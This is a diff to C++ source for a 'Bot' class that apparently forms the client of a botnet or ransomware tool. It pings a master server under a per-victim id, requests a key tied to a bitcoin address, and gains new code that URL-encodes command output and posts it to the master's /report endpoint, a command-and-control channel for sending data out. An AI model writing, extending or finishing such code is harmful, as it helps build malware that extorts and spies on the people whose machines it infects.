@@ -1,3 +1,4 @@
+
 #include<stdio.h>
 #include "bot.h"
 #include "http.h"
@@ -46,7 +47,7 @@ void Bot::display_message(string message) {
 
 }
 string Bot::ping_server() {
-    string res = send_post(get_master() , "/api/" + get_uid() + "/status",  form_ping_json());
+    string res = send_post(get_master() , "/api/" + get_uid() + "/status",  "json", form_ping_json());
     return res;
 }
 string Bot::send_key() {
@@ -58,11 +59,14 @@ string Bot::request_key(string btc_addr) {
     json += btc_addr;
     json += "\" }";
     cout << json << endl;
-    string res = send_post(get_master(), "/api/" + get_uid() + "/status", json);
+    string res = send_post(get_master(), "/api/" + get_uid() + "/status", "json", json);
     return res;
 }
 string Bot::send_output(string output) {
-    return "end";
+    string out = "output=";
+    out += url_encode(output);
+    string res = send_post(get_master(), "/api/" + get_uid() + "/report", "form", out);
+    return res;
 }
 string Bot::run_command(string command) {
     return "end";
